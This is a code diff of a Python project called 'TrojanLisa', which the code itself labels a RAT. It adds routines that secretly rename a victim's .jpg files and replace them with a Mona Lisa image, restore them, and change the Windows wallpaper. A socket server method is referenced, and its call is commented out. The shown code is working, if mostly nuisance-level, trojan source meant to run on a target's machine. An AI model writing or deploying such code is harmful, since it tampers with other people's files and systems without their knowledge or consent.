@@ -2,14 +2,15 @@ import os
 import shutil
 import socket
 import ctypes
-import base64
-import zlib
 import sys
 
 class TrojanLisa:
     def __init__(self):
         self.serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.active = False
+        self.filetype = ".jpg"
+        self.wallpaper = ".." + os.sep + "img" + os.sep + "mona_lisa.jpg"
+        self.extension = "tl_"
 
     """ Server that opens a TCP socket. """
     def host(self, ip_addr, port):
@@ -57,23 +58,47 @@ class TrojanLisa:
 
     """ Replace images within a specified directory and all its children """
     def replace_images(self, root_dir):
-        pass
+        rootdir = os.curdir + os.sep
+        for subdir, dirs, files in os.walk(os.curdir):
+            for file in files:
+                if file.endswith(self.filetype) and not file.startswith(self.extension):
+                    src = os.path.join(os.curdir, file)
+                    tmp_file = os.path.join(os.curdir, self.extension + file)
+                    if not os.path.isfile(tmp_file):
+                        print("Overwriting", file)
+                        hidden_file = self.extension + file
+                        dst = os.path.join(os.curdir, hidden_file)
+                        os.rename(src, dst)
+                        shutil.copyfile(self.wallpaper, src)
+                    else:
+                        print("Already overwrote", file)
 
     """ Restore images to original state within a specified directory and all its children """
     def restore_images(self, root_dir):
-        pass
+        rootdir = os.curdir + os.sep
+        for subdir, dirs, files in os.walk(os.curdir):
+            for file in files:
+                if file.endswith(self.filetype) and file.startswith(self.extension):
+                    original_name = file[3:]
+                    src = os.path.join(os.curdir, file)
+                    dst = os.path.join(os.curdir, original_name)
+                    os.replace(src, dst)
 
     """ Changes target's wallpaper to Mona Lisa """
     def change_wallpaper(self):
         SPI_SETDESKWALLPAPER = 20
-        WALLPAPER_PATH = "E:\\code\\projects\\trojan_lisa\\img\\mona_lisa.jpg"
+        WALLPAPER_PATH = os.path.abspath(self.wallpaper)
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, WALLPAPER_PATH , 0)
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
+    try:
+        arg1 = sys.argv[1]
+    except IndexError:
+        raise SystemExit(f"Usage: {sys.argv[0]} <ip_address>")
+        
     if sys.platform == "win32":
-        trojan_lisa.host('127.0.0.1', 8080)
-        trojan_lisa.replace_images(".")
-        trojan_lisa.restore_images(".")
+        #trojan_lisa.host('127.0.0.1', 8080)
+        pass
     else:
-        print("RAT can only be run on Windows.")
+        print("Trojan Lisa can only be run on Windows.")
